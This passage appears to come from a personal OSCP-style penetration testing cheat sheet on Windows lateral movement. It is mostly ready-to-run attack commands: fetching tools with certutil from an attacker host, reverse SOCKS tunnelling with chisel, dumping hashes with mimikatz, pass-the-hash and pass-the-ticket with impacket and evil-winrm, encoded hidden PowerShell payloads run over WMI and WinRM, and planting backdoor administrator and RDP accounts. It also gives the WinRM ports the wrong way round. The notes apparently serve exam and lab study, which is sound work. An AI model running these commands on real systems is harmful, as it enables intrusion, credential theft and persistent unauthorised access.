Setup chisel tunnel:

```bash
# On remote Windows target
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe

# On local Kali
./chisel server -p 8000 --reverse

# On remote Windows target
chisel64.exe client 192.168.45.217:8000 R:socks
```

Enumerate ports:

```bash
proxychains nmap -sT --top-ports=100 -Pn <IP>
```

Enumerate services:

```bash
proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HASH --shares
```

#### PsExec

Requirements:

- User must be in the **Administrators** local group
- **ADMIN$** share must be available
- **File and Printer Sharing** must be enabled

##### Pass the NTLM Hash of Admin

1. Dump password with mimikatz:

```powershell
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump:sam"
```

2. Use the hash with psexec (format: `LMHash:NTHash`, LMHash set to 0):

```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a39311ea6f0027aa955abed1762964b Administrator@192.168.50.212
```

3. Alternative with `wmiexec`:

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
```

##### Using impacket-psexec

```bash
impacket-psexec active.htb/administrator@10.10.10.100
```

#### WMI, WinRM and evil-winrm

##### WMI (Windows Management Instrumentation)

```powershell
$username = 'jen';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

##### WinRM

Uses port 5985 (encrypted HTTPS) and port 5986 (plain HTTP). Requires domain user in **Administrators** or **Remote Management Users** group.

```powershell
winrs -r:files04 -u:jen -p:passworddd "cmd /c hostname & whoami"
```

Spawn a shell:

```powershell
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC..."
```

##### PowerShell Remoting (`New-PSSession`)

```powershell
$username = 'jen';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Enter-PSSession 1
```

##### evil-winrm

With password:

```bash
proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
```

With hash:

```bash
proxychains evil-winrm -i 10.10.132.146 -u admin -H 4979f29d4cb99845c075c41cf45f24df
```

#### RDP

##### Enable RDP and Add Administrator

```powershell
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe

# Change admin password
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
$UserAccount = Get-LocalUser -Name "Administrator"
$UserAccount | Set-LocalUser -Password $Password

# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Add administrator to RDP group
net localgroup "Remote Desktop Users" "Administrator" /add

# Connect
xfreerdp /u:Administrator /p:"test!" /v:192.168.236.121
```

##### Create New RDP User

```powershell
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
```

##### Enable RDP Remotely

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

$password = ConvertTo-SecureString "vau!XCKjNQBv3$" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
```

#### Pass the Hash

Requirements: SMB (port 445), Windows File and Printer Sharing enabled, ADMIN$ share available, local admin rights.

The attacker connects via SMB and authenticates using the NTLM hash.

**crackmapexec:**

```bash
crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890293116990101307197053
```

**evil-winrm:**

```bash
proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
```

**impacket-psexec:**

```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
```

**impacket-wmiexec:**

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
```

#### Overpass the Hash

Abuse an NTLM hash to gain a full Kerberos TGT, then use it for TGS. Converts NTLM hash into a Kerberos ticket to avoid NTLM authentication.

Using mimikatz `sekurlsa::pth`:

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 /run:powershell
```

This spawns a new PowerShell session as `jen`. Access services to generate TGT/TGS, then use them with tools like Microsoft's PsExec.

#### Pass the Ticket

Export all TGT/TGS tickets from memory:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Inject a ticket:

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Verify:

```powershell
klist
```

#### DCOM

> TODO

#### Golden Ticket

> TODO

#### Shadow Copies

> TODO

---

## Reporting

- https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
